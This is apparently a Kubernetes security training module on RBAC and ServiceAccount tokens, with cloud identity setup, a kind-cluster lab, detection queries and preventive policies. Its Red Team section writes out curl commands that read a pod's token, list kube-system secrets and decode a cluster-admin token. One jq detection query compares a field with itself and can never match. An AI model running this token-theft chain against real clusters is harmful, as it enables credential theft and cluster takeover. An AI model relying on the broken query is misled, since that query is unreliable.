# 06 — RBAC & Service Account Tokens

> **Level:** Intermediate–Advanced
> **Prereqs:** [K8s Attack Surface Overview](k8s-attack-surface-overview.md) (K8s Attack Surface Overview)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Privilege Escalation, Credential Access, Persistence (see ATT&CK Containers matrix)
**Authorization scope:** Run against a local `kind` cluster you own. All `kubectl` commands target personal cluster only. Cloud IAM operations use placeholder account IDs.

## What & why

RBAC and ServiceAccount tokens are the IAM of Kubernetes. A misconfigured RoleBinding — especially one granting `cluster-admin` to a default namespace ServiceAccount — is a single-step cluster takeover. SA tokens are mounted JWTs inside every pod; exfiltration of one grants the attacker the identity of that workload across the entire cluster.

## The OnPrem reality

On-prem Kubernetes (and OpenShift) maps to enterprise LDAP groups. An operator binds an LDAP group to a ClusterRole. SA tokens predate workload identity — they're long-lived bearer tokens stored as Secrets until projected tokens were introduced in K8s 1.24. Legacy clusters still have static SA secrets in plaintext inside etcd.

## Core concepts

```text
ServiceAccount  →  RoleBinding  →  Role  →  Permissions (verbs on resources)
                  ClusterRoleBinding → ClusterRole → Cluster-wide permissions
```

| Component | Scope | Example |
|---|---|---|
| ServiceAccount | Namespaced identity for pods | `default`, `my-app-sa` |
| Role | Namespaced permission set | `get, list pods in default` |
| ClusterRole | Cluster-wide permission set | `get pods in all namespaces` |
| RoleBinding | Binds SA to a Role in a namespace | `my-app-sa → pod-reader (default)` |
| ClusterRoleBinding | Binds SA to a ClusterRole cluster-wide | `my-app-sa → cluster-admin` |
| SA Token | JWT mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` | Bearer token for API auth |

## RBAC primitives — all clouds (K8s-native)

**Least-privilege Role + RoleBinding:**
```yaml
# K8s (all clouds + OnPrem)
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pod-reader-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pod-reader
subjects:
  - kind: ServiceAccount
    name: pod-reader-sa
    namespace: default
```

**Verify bound permissions:**
```bash
kubectl auth can-i list pods --as=system:serviceaccount:default:pod-reader-sa -n default
kubectl auth can-i delete pods --as=system:serviceaccount:default:pod-reader-sa -n default
```

## AWS (EKS + IRSA)

**IRSA (IAM Roles for Service Accounts) — binding a SA to an AWS IAM role:**
```bash
# AWS — create OIDC provider for the cluster
eksctl utils associate-iam-oidc-provider \
  --cluster cluster-sec --approve

# AWS — create IAM role with trust for the SA
aws iam create-role \
  --role-name s3-reader-sa-role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::111111111111:oidc-provider/oidc.eks.us-east-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "oidc.eks.us-east-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71:sub": "system:serviceaccount:default:s3-reader-sa"
        }
      }
    }]
  }'

# AWS — annotate the SA with the IAM role ARN
kubectl annotate serviceaccount s3-reader-sa \
  eks.amazonaws.com/role-arn=arn:aws:iam::111111111111:role/s3-reader-sa-role \
  -n default
```

**Pod uses the annotated SA, gets short-lived AWS credentials:**
```yaml
# AWS
apiVersion: v1
kind: Pod
metadata:
  name: s3-reader
  namespace: default
spec:
  serviceAccountName: s3-reader-sa
  containers:
    - name: app
      image: amazon/aws-cli
      command: ["aws", "s3", "ls"]
```

## Azure (AKS + Workload Identity)

**Azure AD Workload Identity — binding SA to Managed Identity:**
```bash
# Azure — create User-Assigned Managed Identity
az identity create \
  --name s3-reader-identity \
  --resource-group rg-sec

# Azure — create federated identity credential
az identity federated-credential create \
  --name s3-reader-fed \
  --identity-name s3-reader-identity \
  --resource-group rg-sec \
  --issuer "https://westus2.oic.prod-aks.azure.com/00000000-0000-0000-0000-000000000000/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/" \
  --subject "system:serviceaccount:default:s3-reader-sa" \
  --audience "api://AzureADTokenExchange"
```

**SA annotation for Workload Identity:**
```yaml
# Azure
apiVersion: v1
kind: ServiceAccount
metadata:
  name: s3-reader-sa
  namespace: default
  annotations:
    azure.workload.identity/client-id: "00000000-0000-0000-0000-000000000000"
```

## GCP (GKE + Workload Identity Federation)

**Binding a K8s SA to a GCP service account:**
```bash
# GCP — allow K8s SA to impersonate GCP SA
gcloud iam service-accounts add-iam-policy-binding \
  s3-reader@my-sandbox-project.iam.gserviceaccount.com \
  --role roles/iam.workloadIdentityUser \
  --member "serviceAccount:my-sandbox-project.svc.id.goog[default/s3-reader-sa]"
```

**Annotate K8s SA:**
```yaml
# GCP
apiVersion: v1
kind: ServiceAccount
metadata:
  name: s3-reader-sa
  namespace: default
  annotations:
    iam.gke.io/gcp-service-account: s3-reader@my-sandbox-project.iam.gserviceaccount.com
```

## OnPrem mapping (recap table)

| Concern | OnPrem (self-managed) | AWS (EKS) | Azure (AKS) | GCP (GKE) |
|---|---|---|---|---|
| RBAC engine | K8s RBAC | K8s RBAC + aws-auth ConfigMap / EKS access entries | K8s RBAC + Azure RBAC | K8s RBAC + GCP IAM |
| SA token format | Long-lived Secret (pre-1.24) or projected JWT | Projected JWT (1.24+) | Projected JWT | Projected JWT |
| Cloud IAM binding | N/A | IRSA (OIDC → IAM role) | Workload Identity (federated) | Workload Identity Federation |
| Token audience | `kubernetes.default.svc` | `sts.amazonaws.com` | `api://AzureADTokenExchange` | `iam.googleapis.com` |
| Token rotation | Manual / kube-controller-manager | Automatic (projected tokens) | Automatic | Automatic |
| Audit | `kube-apiserver --audit-log-path` | CloudWatch + EKS audit logs | Azure Monitor + diagnostic | Cloud Audit Logs (default) |

## 🔴 Red Team view

**Attack: ServiceAccount token theft → cluster-admin escalation**

**Scenario:** An attacker gains a shell inside a pod running in `namespace: default` with the default ServiceAccount. The default SA has no RBAC bindings — but the attacker discovers a powerful secret.

**Step 1 — Extract the mounted token:**
```bash
# Inside the compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# eyJhbGciOiJSUzI1NiIsImtpZCI6...
```

**Step 2 — Discover what the token can do:**
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods
```

**Step 3 — Enumerate RBAC bindings for escalation paths:**
```bash
# Find all ClusterRoleBindings that reference non-system SAs
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  jq '.items[] | select(.subjects[]?.kind=="ServiceAccount") | {name: .metadata.name, sa: .subjects[].name, role: .roleRef.name}'
```

**Step 4 — Exploit a misbound cluster-admin SA token:**

If the attacker finds a Secret of type `kubernetes.io/service-account-token` in a namespace they can list secrets in:
```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets | \
  jq '.items[] | select(.type=="kubernetes.io/service-account-token") | .metadata.name'
```

If a powerful SA token secret is discovered (e.g., for a SA bound to `cluster-admin`), the attacker decodes it:
```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/<secret-name> | \
  jq -r '.data.token' | base64 -d
```

Now the attacker uses the cluster-admin token to deploy a privileged pod or exfiltrate all secrets across all namespaces.

**Artifacts left:**
- K8s audit logs: `get secrets` in `kube-system` namespace from an unexpected SA (`system:serviceaccount:default:default`)
- API server metrics: increased `apiserver_request_total` from a pod IP that doesn't match any known workload pattern
- CloudTrail (EKS): `sts:AssumeRoleWithWebIdentity` from a pod that doesn't have IRSA configured

## 🔵 Blue Team view

**Detection signals:**

| Signal | Log Source | Query |
|---|---|---|
| SA token used to list secrets in kube-system | K8s audit log | `verb=list resource=secrets namespace=kube-system user.username=system:serviceaccount:*:default` |
| SA from namespace A accessing resources in namespace B | K8s audit log | `objectRef.namespace != userAgent` namespace (requires log correlation) |
| `get secrets` by non-control-plane SA | K8s audit log | `verb=get resource=secrets user.username!="system:kube-*" user.username!="system:node:*"` |
| New ClusterRoleBinding to cluster-admin | K8s audit log | `verb=create resource=clusterrolebindings objectRef.name=cluster-admin` |
| RBAC enumeration (`get roles`, `get clusterroles`) | K8s audit log | `verb=list resource=roles OR clusterroles` from unexpected SA |

**K8s audit log query (jq on audit log file):**
```bash
cat audit.log | jq 'select(.verb == "get" and .objectRef.resource == "secrets" and (.user.username | startswith("system:serviceaccount:default:")) and .objectRef.namespace != .objectRef.namespace)'
```

**Preventive controls:**

- **K8s-native:** Never bind `cluster-admin` to non-system ServiceAccounts. Use `kubectl auth can-i --list` in CI to assert SA permissions. Set `automountServiceAccountToken: false` on pods that don't need API access.
- **AWS:** Use IRSA for all AWS API calls from pods — never mount IAM credentials as env vars or Secrets. Enable EKS audit logs to CloudWatch. SCP denying `iam:CreateAccessKey` to node roles.
- **Azure:** Use Workload Identity instead of Service Principal secrets. Enable AKS diagnostic settings with `kube-audit` category.
- **GCP:** Use Workload Identity Federation for all GCP API calls. GKE audit logs are on by default in Cloud Audit Logs.
- **OnPrem:** Implement projected service account tokens (`--service-account-issuer`) with short TTLs (< 1 hour). Deploy audit log shipping to SIEM.

**Response steps:**
1. Identify the compromised SA: check audit log for anomalous API calls.
2. Delete the compromised SA token secret (triggers new token creation for pods using it).
3. Revoke any cloud IAM credentials the SA had (IRSA/OIDC session).
4. Audit all ClusterRoleBindings and RoleBindings for the compromised SA namespace.
5. Rotate all K8s Secrets readable by the compromised SA.
6. If cluster-admin was obtained, treat as full cluster compromise — rebuild from scratch.

## Hands-on lab

**Goal:** Explore RBAC escalation paths on a local `kind` cluster.

**Steps:**
1. `kind create cluster --name rbac-lab`
2. Create a namespace `dev` and a ServiceAccount `dev-sa`:
   ```bash
   kubectl create ns dev
   kubectl create sa dev-sa -n dev
   ```
3. Create a RoleBinding granting `dev-sa` `get, list pods` in `dev` only.
4. Launch a test pod using `dev-sa`, exec into it, extract the token.
5. Verify the token can `get pods -n dev` but cannot `get pods -n kube-system`.
6. Create a ClusterRoleBinding granting `cluster-admin` to `dev-sa` (simulates misconfiguration).
7. From the pod, verify you can now `get secrets -n kube-system` with the same token.
8. Delete the ClusterRoleBinding and verify access is revoked.
9. Set `automountServiceAccountToken: false` on a pod and verify no token is mounted.
10. Teardown: `kind delete cluster --name rbac-lab`.

**Expected output:** SA token access expands from namespace-scoped to cluster-wide when RoleBinding → ClusterRoleBinding escalation occurs. Token is absent when `automountServiceAccountToken: false`.

## Detection rules & checklists

**OPA/Gatekeeper policy — deny cluster-admin binding to non-system SA:**
```rego
package k8srbac
violation[{"msg": msg}] {
  input.review.kind.kind == "ClusterRoleBinding"
  input.review.object.roleRef.name == "cluster-admin"
  some subject in input.review.object.subjects
  subject.kind == "ServiceAccount"
  not startswith(subject.namespace, "kube-system")
  not startswith(subject.name, "system:")
  msg := sprintf("cluster-admin bound to %v/%v", [subject.namespace, subject.name])
}
```

**CLI audit one-liners:**
```bash
# All clouds: find cluster-admin bindings to ServiceAccounts
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[] | select(.kind=="ServiceAccount")'

# List SAs with automountServiceAccountToken left at default (true)
kubectl get sa --all-namespaces -o json | jq -r '.items[] | select(.automountServiceAccountToken!=false) | "\(.metadata.namespace)/\(.metadata.name)"'

# EKS: check IRSA-annotated SAs (good sign)
kubectl get sa --all-namespaces -o json | jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"]) | "\(.metadata.namespace)/\(.metadata.name)"'

# AKS: verify workload identity annotation exists on SAs
kubectl get sa --all-namespaces -o json | jq '.items[] | select(.metadata.annotations["azure.workload.identity/client-id"]) | "\(.metadata.namespace)/\(.metadata.name)"'

# GKE: verify workload identity binding
gcloud iam service-accounts get-iam-policy s3-reader@my-sandbox-project.iam.gserviceaccount.com

# Audit token TTLs in pod specs
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.automountServiceAccountToken!=false) | .metadata.name'
```

## References
- K8s RBAC: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- EKS IRSA: https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html
- AKS Workload Identity: https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview
- GKE Workload Identity: https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity
- ATT&CK Containers: "Credential Access", "Privilege Escalation"
- Cross-links: [`03-05-k8s-attack-surface-overview.md`](k8s-attack-surface-overview.md), [`../IAM/assume-role-chains.md`](../IAM/assume-role-chains.md)
